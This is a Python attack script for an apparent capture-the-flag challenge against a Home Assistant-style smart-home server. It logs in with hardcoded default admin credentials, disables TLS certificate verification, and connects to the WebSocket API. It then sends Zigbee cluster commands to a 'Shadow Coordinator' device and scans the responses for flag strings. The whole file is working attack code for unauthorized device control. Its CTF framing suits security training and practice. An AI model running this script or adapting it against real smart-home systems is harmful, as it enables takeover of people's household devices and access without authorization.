#!/usr/bin/env python3
import asyncio
import websockets
import json
import ssl
import requests

async def shadow_coordinator_attack():
    # Get fresh token
    login_resp = requests.post("http://training-pod2.ctfchile.com:32780/api/v2/auth/login",
                               json={"username": "admin", "password": "admin1234"})
    token = login_resp.json()["access_token"]

    # Connect to HTTPS target WebSocket
    uri = "wss://training.my-ctf.com:8812/api/websocket"

    # Create SSL context that ignores certificate errors
    ssl_context = ssl.create_default_context()
    ssl_context.check_hostname = False
    ssl_context.verify_mode = ssl.CERT_NONE

    try:
        async with websockets.connect(uri, ssl=ssl_context) as websocket:
            print("[+] Connected to Shadow Coordinator WebSocket")

            # Auth handshake
            auth_req = await websocket.recv()
            print(f"[*] Auth request: {auth_req}")

            await websocket.send(json.dumps({"type": "auth", "access_token": token}))

            auth_resp = await websocket.recv()
            print(f"[*] Auth response: {auth_resp}")

            if "auth_ok" not in auth_resp:
                print("[-] Auth failed")
                return

            # Subscribe to all events
            await websocket.send(json.dumps({"type": "subscribe_events"}))
            print("[+] Subscribed to Shadow Coordinator events")

            # Send direct command via WebSocket to the compromised coordinator
            shadow_commands = [
                {"type": "call_service", "domain": "zha", "service": "issue_zigbee_cluster_command",
                 "service_data": {"ieee": "00:12:4B:00:24:AA:10:01", "cluster_id": 257, "command": "get_flag"}},

                {"type": "call_service", "domain": "sensor", "service": "turn_on",
                 "service_data": {"entity_id": "sensor.zb_gw_03_status"}},

                {"type": "call_service", "domain": "zha", "service": "get_zigbee_cluster_attribute",
                 "service_data": {"ieee": "00:12:4B:00:24:AA:10:01", "cluster_id": 257, "attribute": "flag"}},
            ]

            for i, cmd in enumerate(shadow_commands):
                print(f"\\n[*] Sending Shadow Coordinator command {i+1}...")
                await websocket.send(json.dumps(cmd))

                # Listen for responses
                try:
                    for _ in range(3):
                        response = await asyncio.wait_for(websocket.recv(), timeout=5.0)
                        response_data = json.loads(response)

                        print(f"    Response {_+1}: {json.dumps(response_data, indent=2)}")

                        # Check for flag patterns
                        response_str = str(response_data).lower()
                        if any(keyword in response_str for keyword in ['flag', 'ctf{', 'ctfchile{', 'shadow']):
                            print(f"[!] POTENTIAL FLAG IN RESPONSE: {response_data}")

                        # Check if this is a result with data
                        if response_data.get('type') == 'result' and 'result' in response_data:
                            result_data = response_data['result']
                            print(f"[!] COMMAND RESULT: {json.dumps(result_data, indent=2)}")

                except asyncio.TimeoutError:
                    print(f"    No response within timeout for command {i+1}")

                await asyncio.sleep(1)

            # Listen for additional events from the Shadow Coordinator
            print("\\n[*] Monitoring Shadow Coordinator for 30 seconds...")
            try:
                for _ in range(30):
                    message = await asyncio.wait_for(websocket.recv(), timeout=1.0)
                    msg_data = json.loads(message)

                    msg_str = str(msg_data).lower()
                    if any(keyword in msg_str for keyword in ['flag', 'ctf', 'shadow', 'coordinator', 'unlocked']):
                        print(f"[!] SHADOW COORDINATOR EVENT: {json.dumps(msg_data, indent=2)}")

            except asyncio.TimeoutError:
                pass

            print("\\n[*] Shadow Coordinator session complete")

    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    asyncio.run(shadow_coordinator_attack())